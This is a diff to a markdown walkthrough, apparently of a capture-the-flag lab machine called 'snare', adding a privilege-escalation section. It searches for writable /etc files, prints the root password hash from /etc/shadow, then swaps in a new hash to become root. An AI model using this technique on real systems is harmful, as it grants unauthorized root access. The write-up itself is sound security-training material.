@@ -1,4 +1,4 @@
-## This note contains pwning from beginning to the end of every targets. 
+![image](https://github.com/user-attachments/assets/3fd8edfa-da0f-4be8-96ef-8be9d1abfe45)## This note contains pwning from beginning to the end of every targets. 
 
 ![image](https://github.com/user-attachments/assets/249c6f61-b546-4373-b86e-49ac71dfa42a)
 
@@ -600,7 +600,40 @@ we got a request on our http server. it appends `.php` to the end of every file 
 
 
 
-> Privilege Escalation 
+### Privilege Escalation 
+
+> checking for writeable `/etc` files
+
+```bash
+www-data@snare:/tmp$ find /etc/ -type f -writable 2>/dev/null
+/etc/shadow
+www-data@snare:/tmp$
+```
+we can see we have write access to the `/etc/shadow` file.
+
+> Exploiting writable `/etc/shadow` file
+
+![image](https://github.com/user-attachments/assets/2798249a-7e52-4100-96b6-7ce2a66ff17b)
+
+check the content of the `/etc/shadow` file, we can see root hash
+
+```
+root:$6$b8wkwLbICzuTqPiO$dFLYb8ZNEpfGLRnvODlyGfjtZQTV85FJCDCBGiZEU9b3laym9RJo144xkYEldB419O1Q3E5FARrKRRn/LrtZc0:18586:0:99999:7:::
+```
+
+![image](https://github.com/user-attachments/assets/92f11d65-9a6a-4ad9-9ae0-7df9926bc80b)
+
+```
+$6$X2OxC7wg31bWpbtT$krRWSN9Us0d5f5hZqRSKJBdwppmyPcGkMSKULarhiC5Qe/Nk5azDzmLDu9kkbs44vuzyeRocZFUO/tXA70cr/1
+```
+
+![image](https://github.com/user-attachments/assets/03be9d32-dc8c-4a1c-99cf-7d1212d71fcc)
+
+replace the hash with the new hash generated.
+
+![image](https://github.com/user-attachments/assets/bb2b16e5-dbe4-475e-a558-a679fd1b0535)
+
+su user root using the password created, and we got root.
 
 
 
